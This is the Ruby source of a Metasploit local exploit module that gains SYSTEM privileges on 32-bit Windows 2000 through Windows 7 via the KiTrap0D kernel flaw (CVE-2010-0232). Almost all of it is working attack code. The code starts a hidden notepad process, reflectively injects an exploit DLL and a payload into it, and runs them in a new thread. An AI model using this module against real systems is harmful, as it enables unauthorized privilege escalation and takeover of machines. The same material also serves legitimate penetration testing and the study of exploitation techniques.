# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/exe&#039;
require &#039;rex&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking

  include Post::File
  include Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      &#039;Name&#039;          => &#039;Windows SYSTEM escalation via KiTrap0D&#039;,
      &#039;Description&#039;   => %q{
        This module will create a new session with SYSTEM privileges via the
        KiTrap0D exlpoit by Tavis Ormandy. If the session is use is already
        elevated then the exploit will not run. The module relies on kitrap0d.x86.dll,
        and is not supported on x64 editions of Windows.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [
          &#039;Tavis Ormandy&#039;, # Original resesarcher and exploit creator
        ],
      &#039;Platform&#039;      => [ &#039;win&#039; ],
      &#039;Targets&#039;       => [
        [ &#039;Windows 2K SP4 - Windows 7 (x86)&#039;, { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;win&#039; } ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;References&#039;    => [
        [ &#039;CVE&#039;, &#039;2010-0232&#039; ],
        [ &#039;OSVDB&#039;, &#039;61854&#039; ],
        [ &#039;MSB&#039;, &#039;MS10-015&#039; ],
        [ &#039;EDB&#039;, &#039;11199&#039; ],
        [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2010/Jan/341&#039; ]
      ],
      &#039;DisclosureDate&#039;=> "Jan 19 2010"
    ))

  end

  def check
    # Validate platform architecture
    if sysinfo["Architecture"] =~ /x64|WOW64/i
      return Exploit::CheckCode::Safe
    end

    # Validate OS version
    winver = sysinfo["OS"]
    unless winver =~ /Windows 2000|Windows XP|Windows Vista|Windows 2003|Windows 2008|Windows 7/
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Appears
  end

  def exploit
    if is_system?
      fail_with(Exploit::Failure::None, &#039;Session is already elevated&#039;)
    end

    if check == Exploit::CheckCode::Safe
      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system.")
    end

    dll = &#039;&#039;
    offset = nil

    print_status("Launching notepad to host the exploit...")
    cmd = "notepad.exe"
    opts = {&#039;Hidden&#039; => true}
    process = client.sys.process.execute(cmd, nil, opts)
    pid = process.pid
    host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
    print_good("Process #{pid} launched.")

    print_status("Reflectively injecting the exploit DLL into #{pid}...")
    library_path = ::File.join(Msf::Config.data_directory, "exploits",
                               "CVE-2010-0232", "kitrap0d.x86.dll")
    library_path = ::File.expand_path(library_path)
    ::File.open(library_path, &#039;rb&#039;) { |f| dll = f.read }
    pe = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(dll))
    pe.exports.entries.each do |e|
      if e.name =~ /^\S*ReflectiveLoader\S*/
        offset = pe.rva_to_file_offset(e.rva)
        break
      end
    end
    # Inject the exloit, but don&#039;t run it yet.
    exploit_mem = inject_into_pid(dll, host_process)

    print_status("Exploit injected. Injecting payload into #{pid}...")
    # Inject the payload into the process so that it&#039;s runnable by the exploit.
    payload_mem = inject_into_pid(payload.encoded, host_process)

    print_status("Payload injected. Executing exploit...")
    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    host_process.thread.create(exploit_mem + offset, payload_mem)

    print_good("Exploit finished, wait for (hopefully privileged) payload execution to complete.")
  end

protected

  def inject_into_pid(payload, process)
    payload_size = payload.length
    payload_size += 1024 - (payload.length % 1024) unless payload.length % 1024 == 0
    payload_mem = process.memory.allocate(payload_size)
    process.memory.protect(payload_mem)
    process.memory.write(payload_mem, payload)
    return payload_mem
  end

end

